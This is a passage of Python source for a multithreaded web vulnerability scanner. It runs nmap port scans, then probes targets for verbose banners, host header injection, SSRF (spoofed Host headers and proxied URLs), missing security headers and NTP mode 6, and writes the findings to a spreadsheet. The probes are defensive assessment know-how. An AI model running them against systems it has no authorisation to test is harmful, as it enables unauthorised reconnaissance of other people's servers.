				if "apache" in str((data1.content)).lower() or "asp.net" in str((data1.content)).lower():
					print ("\t-> Verbose Server Banner in content")
					instance = "{}:{}".format(IP, port)
					verboseServerBannerContentStore.update({instance:str(data1.request.headers)})

			dataCustom = oneRequest(None, customAddress1)
			if "apache" in str((dataCustom.content)).lower() or "asp.net" in str((dataCustom.content)).lower():
				print ("\t-> Verbose Server Banner in content")
				instance = "{}:{}".format(IP, port)
				verboseServerBannerContentStore.update({instance:str(dataCustom.request.headers)})

			if protocol == "https":
				dataCustom1 = oneRequest(None, customAddresshttps1)

				if "apache" in str((dataCustom1.content)).lower() or "asp.net" in str((dataCustom1.content)).lower():
					print ("\t-> Verbose Server Banner in content")
					instance = "{}:{}".format(IP, port)
					verboseServerBannerContentStore.update({instance:str(dataCustom1.request.headers)})


			dataCustomUA = oneRequest(headers, customAddressUserAgent)

			if "stack trace" in str((dataCustomUA)).lower() or "exception" in str((dataCustomUA.content)).lower() or "javax.servlet" in str((dataCustomUA.content)).lower():
				print ("\t-> Verbose Server Error")
				instance = "{}:{}".format(IP, port)
				payload = "Possible Stack trace, please check\n\n{}".format(dataCustomUA.request.headers)
				verboseServerErrorStore.update({instance:str(dataCustomUA.request.headers)})

			if "apache" in str((dataCustomUA)).lower() or "asp.net" in str((dataCustomUA.content)).lower():
				print ("\t-> Verbose Server Banner in content")
				instance = "{}:{}".format(IP, port)
				verboseServerBannerContentStore.update({instance:str(dataCustomUA.request.headers)})


			dataCustomUA1 = oneRequest(headers, customAddressUserAgent)

			if "stack trace" in str((dataCustomUA1)).lower() or "exception" in str((dataCustomUA1.content)).lower() or "javax.servlet" in str((dataCustomUA1.content)).lower():
				print ("\t-> Verbose Server Error")
				instance = "{}:{}".format(IP, port)
				payload = "Possible Stack trace, please check\n\n{}".format(dataCustomUA1.request.headers)
				verboseServerErrorStore.update({instance:str(dataCustomUA1.request.headers)})

			if "apache" in str((dataCustomUA1)).lower() or "asp.net" in str((dataCustomUA1.content)).lower():
				print ("\t-> Verbose Server Banner in content")
				instance = "{}:{}".format(IP, port)
				verboseServerBannerContentStore.update({instance:str(dataCustomUA1.request.headers)})
			

			dataCustomHost = oneRequest(headers1, customAddressUserAgent)

			if "apache" in str((dataCustomHost)).lower() or "asp.net" in str((dataCustomHost.content)).lower():
				print ("\t-> Verbose Server Banner in content")
				instance = "{}:{}".format(IP, port)
				verboseServerBannerContentStore.update({instance:str(dataCustomHost.request.headers)})

			if protocol == "https":		
				dataCustomHost1 = oneRequest(headers1, customAddresshttpsUserAgent)

				if "apache" in str((dataCustomHost1)).lower() or "asp.net" in str((dataCustomHost1.content)).lower():
					print ("\t-> Verbose Server Banner in content")
					instance = "{}:{}".format(IP, port)
					verboseServerBannerContentStore.update({instance:str(dataCustomHost1.request.headers)})

		except Exception as e:

			proxyError(e, "")
			replace = 1

	

def VerboseServerBanner(IP, loopPorts, status):

	print ("\n[*] Verbose Server Banner Check")

	headers = {'Upgrade-Insecure-Requests':'1', \
'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',\
'Accept-Encoding':'gzip, deflate',\
'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36',\
'Connection': 'close'} 


	if "https" in status or "ssl" in status: 

		SSLaddress = "https://{}:{}".format(IP, loopPorts)

		try:

			dataSSL = oneRequest(headers, SSLaddress)
			
			verboseServerBannerCheck(dataSSL, IP, "https", loopPorts)
			extractPath(dataSSL.content, IP, loopPorts, "vsb")
			extractPath(dataSSL.headers, IP, loopPorts, "vsb")

			if dataSSL.status_code == 302:

				redirectData = allRedirectRequests(headers, IP, loopPorts, dataSSL)

				if redirectData == None:
					errorReceived = 1
				else:

					verboseServerBannerCheck(redirectData, IP, "https", loopPorts)
					extractPath(redirectData.content, IP, loopPorts, "vsb")
					extractPath(redirectData.headers, IP, loopPorts, "vsb")

		except Exception as e:
			proxyError(e, "")
			replace = 1
	
	else:
			
		address = "http://{}:{}".format(IP, loopPorts)

		try:

			data = oneRequest(headers, address)
			verboseServerBannerCheck(data, IP, "http", loopPorts)
			extractPath(data.content, IP, loopPorts, "vsb")
			extractPath(data.headers, IP, loopPorts, "vsb")

			if data.status_code == 302:

				redirectData = allRedirectRequests(headers, IP, loopPorts, data)

				if redirectData == None:
					errorReceived = 1
				else:

					verboseServerBannerCheck(redirectData, IP, "https", loopPorts)
					extractPath(redirectData.content, IP, loopPorts, "vsb")
					extractPath(redirectData.headers, IP, loopPorts, "vsb")


		except Exception as e:
			replace = 1
			proxyError(e, "")
						


@profile
def hostHeaderInjection(IP, loopPorts, status):

	print ("\n[*] Host Header Injection Check")

	headers = {'Host': 'www.oteri.com', 'Upgrade-Insecure-Requests':'1', \
'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36',\
'Connection': 'close'} 


	if "https" in status or "ssl" in status:

		addreSSL = "https://{}:{}".format(IP, loopPorts)

		try:
			injectionSSL = oneRequest(headers, addreSSL)

			if "location" in str((injectionSSL.headers)).lower():

				if "oteri" in injectionSSL.headers['Location']:
					#print(injectionSSL.headers['Location'])
					print ("\t-> Host Header Injection Successful")
					instance = "{}:{}".format(IP, loopPorts)
					payloadLocation = "Reflected in the location header\n\nRequest Headers:\n{}".format(str(injectionSSL.request.headers))
					hostHeaderInjectionStore.update({instance:payloadLocation})

				if "oteri" in str(injectionSSL.content):
					print("\t-> Host header value reflected in body")
					instance = "{}:{}".format(IP, loopPorts)
					payloadLocation = "Reflected in the body of the response\n\nRequest Headers:\n{}".format(str(injectionSSL.request.headers))
					hostHeaderInjectionStore.update({instance:payloadLocation})

		except requests.exceptions.RequestException as e:
			replace = 1
			exception = 1
			proxyError(e, "")

	else:

		address = "http://{}:{}".format(IP, loopPorts)
		#print(address)

		try:
			injection = oneRequest(headers, address)

			if "location" in str((injection.headers)).lower():

				if "oteri" in injection.headers['Location']:
					print ("\t-> Host Header Injection Successful")
					instance = "{}:{}".format(IP, loopPorts)
					payloadLocation = "Reflected in the location header\n\nRequest Headers:\n{}".format(str(injection.request.headers))
					hostHeaderInjectionStore.update({instance:payloadLocation})

				if "oteri" in str(injection.content):
					print("\t-> Host header value reflected in body")
					instance = "{}:{}".format(IP, loopPorts)
					payloadLocation = "Reflected in the body of the response\n\nRequest Headers:\n{}".format(str(injection.request.headers))
					hostHeaderInjectionStore.update({instance:payloadLocation})


		except requests.exceptions.RequestException as e:
			replace = 1
			exception = 1
			proxyError(e, "")
			

@profile
def	ssrf(IP, loopPorts, status):

	print ("\n[*] Server Side Request Forgery Check")

	headers = {'Upgrade-Insecure-Requests':'1', \
'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36',\
'Connection': 'close'} 

	headersValid = {'Host': '8.8.8.8', 'Upgrade-Insecure-Requests':'1', \
'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36',\
'Connection': 'close'} 

	headersInvalid = {'Host': '8.8.8.81', 'Upgrade-Insecure-Requests':'1', \
'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36',\
'Connection': 'close'} 

	headersValidloop = {'Host': '127.0.0.1', 'Upgrade-Insecure-Requests':'1', \
'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36',\
'Connection': 'close'} 

	headersInvalidloop = {'Host': '127.0.0.11', 'Upgrade-Insecure-Requests':'1', \
'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36',\
'Connection': 'close'} 


	status1 = ""
	status2 = ""
	status3 = ""
	status4 = ""


	if "https" in status or "ssl" in status:
	

		addreSSL = "https://{}:{}".format(IP, loopPorts)

		try:
			address = "https://{}:{}/http://www.google.com".format(IP, loopPorts)
			address1 = "https://{}{}/http://www.oteri420.com".format(IP, loopPorts)

			injectionSSL = oneRequest(headersValid, address)
			injectionSSL1 = oneRequest(headersValid, address1)
			
			test1 = injectionSSL.status_code
			test2 = injectionSSL1.status_code

			if test1 != test2:
				print ("\t-> Vulnerable to SSRF")
				instance = "{}:{}".format(IP, loopPorts)
				payloadLocation = "Injected in URL\n\nURL: {}\nRequest Headers:\n{}\n\nURL: {}\nRequest Headers:\n{}".format(address, str(injectionSSL.request.headers), address1, str(injectionSSL1.request.headers))
				ssrfStore.update({instance:payloadLocation})

			if "Google Search" in str(injectionSSL.content) or "I'm Feeling Lucky" in str(injectionSSL.content):
				print ("\t-> Vulnerable to SSRF")
				instance = "{}:{}".format(IP, loopPorts)
				payloadLocation = "Injected in URL\n\nURL: {}\nRequest Headers:\n{}\n\nURL: {}\nRequest Headers:\n{}".format(address, str(injectionSSL.request.headers), address1, str(injectionSSL1.request.headers))
				ssrfStore.update({instance:payloadLocation})

			
			injectionSSL2 = oneRequest(headersValid, addreSSL)
			status1 = injectionSSL2.status_code

			injectionSSL3 = oneRequest(headersInvalid, addreSSL)
			status2 = injectionSSL3.status_code
			
			injectionSSL4 = oneRequest(headersInvalidloop, addreSSL)
			status3 = injectionSSL4.status_code

			
			injectionSSL5 = oneRequest(headersInvalidloop, addreSSL)
			status4 = injectionSSL5.status_code

			resultSSRF = set((status1, status2, status3, status4))


			if len(resultSSRF) > 1:

				if status1 == status3 and status2 == status4:
				
					print ("\t-> Vulnerable to SSRF")
					instance = "{}:{}".format(IP, loopPorts)
					payloadLocation = "Injected in the Host header\n\nURL: {}\nRequest Headers:\n{}\n\nURL: {}\n{}\n\nURL: {}\n{}\n\nURL: {}\n{}".format(addreSSL, str(injectionSSL2.request.headers), addreSSL, str(injectionSSL3.request.headers), addreSSL, str(injectionSSL4.request.headers), addreSSL, str(injectionSSL5.request.headers))
					ssrfStore.update({instance:payloadLocation})

		except requests.exceptions.RequestException as e:
			replace = 1
			exception = 1
			proxyError(e, "")


	else:

		#print(address)

		try:
			address = "http://{}:{}/http://www.google.com".format(IP, loopPorts)
			address1 = "http://{}:{}/http://www.oteri420.com".format(IP, loopPorts)

			injectionSSL = oneRequest(headersValid, address)
			injectionSSL1 = oneRequest(headersValid, address1)
			
			test1 = injectionSSL.status_code
			test2 = injectionSSL1.status_code

			if test1 != test2:
				print ("\t-> Vulnerable to SSRF")
				instance = "{}:{}".format(IP, loopPorts)
				payloadLocation = "Injected in URL\n\nURL: {}\nRequest Headers:\n{}\n\nURL: {}\n{}\n".format(address, str(injectionSSL.request.headers), address1, str(injectionSSL1.request.headers))
				ssrfStore.update({instance:payloadLocation})

				
			address = "http://{}:{}".format(IP, loopPorts)

			injectionSSL2 = oneRequest(headersValid, address)
			status1 = injectionSSL2.status_code


			injectionSSL3 = oneRequest(headersInvalid, address)
			status2 = injectionSSL3.status_code

			injectionSSL4 = oneRequest(headersValidloop, address)
			status3 = injectionSSL4.status_code


			injectionSSL5 = oneRequest(headersInvalidloop, address)
			status4 = injectionSSL5.status_code


			resultSSRF = set((status1, status2, status3, status4))

			if len(resultSSRF) > 1:
				
				if status1 == status3 and status2 == status4:
					
					print ("\t-> Vulnerable to SSRF")
					instance = "{}:{}".format(IP, loopPorts)
					payloadLocation = "Injected in the Host header\n\nURL: {}\nRequest Headers:\n{}\n\nURL: {}\n{}\n\nURL: {}\n{}\n\nURL: {}\n{}".format(address, str(injectionSSL2.request.headers), address, str(injectionSSL3.request.headers), address, str(injectionSSL4.request.headers), address, str(injectionSSL5.request.headers))
					ssrfStore.update({instance:payloadLocation})


		except requests.exceptions.RequestException as e:
			replace = 1
			exception = 1
			proxyError(e, "")
			

	resultSSRF = set()



def worksheetFill():

	worksheet.set_default_row(25)
	worksheetWeb.set_default_row(25)


	row = 2
	col = 0
	for key,value in expiredCerts.items():
		worksheet.write(row, col, key, cell_format)
		worksheet.set_column(row, col, 25)
		worksheet.write(row, col+1, value, cell_format) 
		worksheet.set_column(row, col+1, 25)
		row +=1

	row = 2
	col = 3
	for key,value in soonToExpireCerts.items():
		worksheet.write(row, col, key, cell_format) 
		worksheet.set_column(row, col, 25)
		worksheet.write(row, col+1, value, cell_format)
		worksheet.set_column(row, col+1, 25) 
		row +=1

	row = 2
	col = 6
	for key,value in anonCiphersStore.items():
		worksheet.write(row, col, key, cell_format) 
		worksheet.set_column(row, col, 25)
		worksheet.write(row, col+1, value, cell_format)
		worksheet.set_column(row, col+1, 25) 
		row +=1

	row = 2
	col = 9
	for key,value in httpsNotEnabled.items():
		worksheet.write(row, col, key, cell_format) 
		worksheet.set_column(row, col, 25)
		worksheet.write(row, col+1, value, cell_format)
		worksheet.set_column(row, col+1, 25) 
		row +=1

	row = 2
	col = 12
	for key,value in httpsNotEnforced.items():
		worksheet.write(row, col, key, cell_format) 
		worksheet.set_column(row, col, 25)
		worksheet.write(row, col+1, value, cell_format)
		worksheet.set_column(row, col+1, 25) 
		row +=1

	row = 2
	col = 15
	for key,value in HSTSMisconfig.items():
		worksheet.write(row, col, key, cell_format) 
		worksheet.set_column(row, col, 25)
		worksheet.write(row, col+1, value, cell_format)
		worksheet.set_column(row, col+1, 25) 
		row +=1

	row = 2
	col = 18
	for key,value in SSL2.items():
		worksheet.write(row, col, key, cell_format) 
		worksheet.set_column(row, col, 25)
		row +=1

	row = 2
	col = 21
	for key,value in SSL3.items():
		worksheet.write(row, col, key, cell_format) 
		worksheet.set_column(row, col, 25)
		row +=1

	row = 2
	col = 22
	for key,value in TLS1.items():
		worksheet.write(row, col, key, cell_format) 
		worksheet.set_column(row, col, 25)
		row +=1

	row = 2
	col = 0
	for key,value in verboseServerBannerStore.items():
		worksheetWeb.write(row, col, key, cell_format) 
		worksheetWeb.set_column(row, col, 25)
		worksheetWeb.write(row, col+1, value, cell_format) 
		worksheetWeb.set_column(row, col+1, 25)
		row +=1

	row = 2
	col = 3
	for key,value in verboseServerBannerContentStore.items():
		worksheetWeb.write(row, col, key, cell_format) 
		worksheetWeb.set_column(row, col, 25)
		worksheetWeb.write(row, col+1, value, cell_format) 
		worksheetWeb.set_column(row, col+1, 25)
		row +=1

	row = 2
	col = 6
	for key,value in hostHeaderInjectionStore.items():
		worksheetWeb.write(row, col, key, cell_format) 
		worksheetWeb.set_column(row, col, 25)
		worksheetWeb.write(row, col+1, value, cell_format) 
		worksheetWeb.set_column(row, col+1, 25)
		row +=1

	row = 2
	col = 9
	for key,value in internalIPDisclosureStore.items():
		worksheetWeb.write(row, col, key, cell_format) 
		worksheetWeb.set_column(row, col, 25)
		worksheetWeb.write(row, col+1, value, cell_format) 
		worksheetWeb.set_column(row, col+1, 25)
		row +=1

	row = 2
	col = 12
	for key,value in bigIPDisclosureStore.items():
		worksheetWeb.write(row, col, key, cell_format) 
		worksheetWeb.set_column(row, col, 25)
		worksheetWeb.write(row, col+1, value, cell_format) 
		worksheetWeb.set_column(row, col+1, 25)
		row +=1

	row = 2
	col = 15
	for key,value in ssrfStore.items():
		worksheetWeb.write(row, col, key, cell_format) 
		worksheetWeb.set_column(row, col, 25)
		worksheetWeb.write(row, col+1, value, cell_format) 
		worksheetWeb.set_column(row, col+1, 25)
		row +=1

	row = 2
	col = 18
	for key,value in verboseServerErrorStore.items():
		worksheetWeb.write(row, col, key, cell_format) 
		worksheetWeb.set_column(row, col, 25)
		worksheetWeb.write(row, col+1, value, cell_format) 
		worksheetWeb.set_column(row, col+1, 25)
		row +=1

	row = 2
	col = 21
	for key,value in extractPathStore.items():
		worksheetWeb.write(row, col, key, cell_format) 
		worksheetWeb.set_column(row, col, 25)
		worksheetWeb.write(row, col+1, value, cell_format) 
		worksheetWeb.set_column(row, col+1, 25)
		row +=1

	row = 2
	col = 24
	for key,value in missingOrInsecureHeaders.items():
		worksheetWeb.write(row, col, key, cell_format) 
		worksheetWeb.set_column(row, col, 25)
		worksheetWeb.write(row, col+1, value, cell_format) 
		worksheetWeb.set_column(row, col+1, 25)
		row +=1

	row = 2
	col = 0
	for key,value in ntpStore.items():
		worksheetNetwork.write(row, col, key, cell_format) 
		worksheetNetwork.set_column(row, col, 25)
		worksheetNetwork.write(row, col+1, value, cell_format) 
		worksheetNetwork.set_column(row, col+1, 25)
		row +=1


def enumerate(IP, port, status, args):

	ssl(IP, port, status)
	VerboseServerBanner(IP, port, status)
	hostHeaderInjection(IP, port, status)
	allSecurityHeaders(IP, port, status)
	internalIPAddressDisclosure(IP, port, status, args)
	#BIGIPcookieInformationDisclosure(IP, port, status)
	ssrf(IP, port, status)
	ntpMode6(IP)
	
@profile
def nmap(IP, port):

	import nmap

	storeOpenPorts = {}

	argument = "-Pn -p80,443,8443,8080,{}".format(port)

	try:
		nm = nmap.PortScanner()
		nm.scan(IP, arguments=argument)

		
		p80 = nm[IP]['tcp'][80]
		#print(nm[IP]['tcp'][443])
		p443 = nm[IP]['tcp'][443]
		#print(nm[IP]['tcp'][8080])
		p8080 = nm[IP]['tcp'][8080]
		#print(nm[IP]['tcp'][8443])
		p8443 = nm[IP]['tcp'][8443]

		if p80.get("state") == "open":
			storeOpenPorts.update({"80":p80.get("name")})

		if p443.get("state") == "open":
			storeOpenPorts.update({"443":p443.get("name")})

		if p8080.get("state") == "open":
			storeOpenPorts.update({"8080":p8080.get("name")})

		if p8443.get("state") == "open":
			storeOpenPorts.update({"8443":p8443.get("name")})

	except Exception as e:
		replace = 1


	if port.strip() != "":
		
		if "," in port:
			port = port.split(",")
			#print(port)

			for i in port:
				pCustom = ""
				pCustom = nm[IP]['tcp'][int(i)]

				if pCustom.get("state") == "open":
					storeOpenPorts.update({i:pCustom.get("name")})

		else:
			pCustom = ""
			pCustom = nm[IP]['tcp'][int(port)]
			if pCustom.get("state") == "open":
				storeOpenPorts.update({port:pCustom.get("name")})


	#print(storeOpenPorts)
	return storeOpenPorts

@profile
def startScan(args, ip):
	
	print ("\n\nScanning: {}".format(ip))
	
	if args.port:
		openPorts = nmap(ip, args.port)
	else:
		port=""
		openPorts = nmap(ip, port)
	
	#openPorts = {"80":"open", "8080":"open", "443":"open", "8443":"open"}
	#print(openPorts)
	ip = str(ip)
	for port, status in openPorts.items():
		
		if args.full:
			
			enumerate(ip, port, status, args)

		else:

			if args.hc:
				allSecurityHeaders(ip, port, status)
			if args.hhi:
				hostHeaderInjection(ip, port, status)
			if args.vsb:			
				VerboseServerBanner(ip, port, status)
			if args.bigip:
				BIGIPcookieInformationDisclosure(ip, port, status)
			if args.iid:
				internalIPAddressDisclosure(ip, port, status, args)
			if args.ssl:
				ssl(ip, port, status)
			if args.ssrf:
				ssrf(ip, port, status)
			if args.ntp:
				ntpMode6(ip)

@profile
def arguments(args):

	global proxyDict

	if args.proxy:
		
		proxyValHttp = "http://{}".format(args.proxy)
		proxyValHttps = "https://{}".format(args.proxy)

		proxyDict = { 
          "http"  : proxyValHttp, 
          "https" : proxyValHttps
        	}

		try:
			address = "https://www.google.com"
			proxyCheck = oneRequest(None, address)
		except Exception as e:
			replace = 1
			proxyError(e, "scan")
			
	else:
		proxyDict = {}


	#Multi-Threading 
	q = queue.Queue()

	def threader():

		while True:
			worker = q.get()

			if worker is None:
				break

			startScan(args, worker)
			
			q.task_done()


	if args.threads:
		if int(args.threads) > 20:
			print("\nMax 20 threads allowed\n")
			numberOfThreads = 5
		else:
			numberOfThreads = int(args.threads)

	else:
		numberOfThreads = 1

	threads = []

	for x in range(int(numberOfThreads)):
	     
		t = threading.Thread(target=threader)
		t.daemon = True
		t.start()

		threads.append(t)
		

	with open(args.filename) as f:
			
		for ip in f:
			ip = ip.strip()

			if ip == "":
				continue
			else:
				q.put(ip)

	q.join()
	
	for i in range(numberOfThreads):
	    q.put(None)

	
	for t in threads:
		t.join()


if len(sys.argv) < 3:

	sys.argv.append('--help')

parser = argparse.ArgumentParser()
parser.add_argument('filename', help="file path with ip addresses to scan")
parser.add_argument('--port', help='scan custom port, use comma-seperated values for multiple ports')
parser.add_argument('--proxy', help='use an intercepting proxy, provide IP and Port number. eg. --proxy 127.0.0.1:8080')
parser.add_argument('--threads', help='number of threads to use: default 1, maximum 5')
parser.add_argument('--bigip', help='check if BIGIP cookie is present and whether it is vulnerable to information disclosure',  action="store_true")
parser.add_argument('--full', help='scan for all options given below',  action="store_true")
parser.add_argument('--hc', help='check for any misconfigurations or missing security headers',  action="store_true")
parser.add_argument('--hhi', help='check if application is vulnerable to Host Header Injection',  action="store_true")
parser.add_argument('--vsb', help='check if the application returns a verbose server banner',  action="store_true")
parser.add_argument('--iid', help='check if the application discloses internal ip addresses',  action="store_true")
parser.add_argument('--ssl', help="check if there are ssl related vulnerabilities or misconfigurations",   action="store_true")
parser.add_argument('--ssrf', help="response based detection for server side request forgery",   action="store_true")
parser.add_argument('--ntp', help='check if the remote NTP server responds to mode 6 queries',  action="store_true")


args = parser.parse_args()

arguments(args)
worksheetFill()
workbook.close() 
ipList = set()

end = time.time()
print("\nTotal Runtime of Script: ")
print(end - start)

#os.kill(os.getppid(), signal.SIGHUP)
'''
IPAddressFile = sys.argv[1]

with open(IPAddressFile) as file:
	for IP in file:
		print ("IP")
		enumerate(IP)

'''

#hostHeaderInjection()
#hsts()
#VerboseServerBanner()
#internalIPAddressDisclosure()
#BIGIPcookieInformationDisclosure()

'''			allPortsToScan = ""
			count = 0

			for i in openPorts:
				allPortsToScan += i
				if count == len(openPorts)-1:
					break		
				allPortsToScan += ","
			print(allPortsToScan)

			if args.port:
				if args.full:
					enumerate(ip, args.port)
				else:
					if args.hsts:
						hsts(ip, args.port)
					if args.hhi:
						hostHeaderInjection(ip, args.port)
					if args.vsb:
						VerboseServerBanner(ip, args.port)
					if args.bigip:
						BIGIPcookieInformationDisclosure(ip, args.port)
					if args.iid:
						internalIPAddressDisclosure(ip, args.port)
'''			
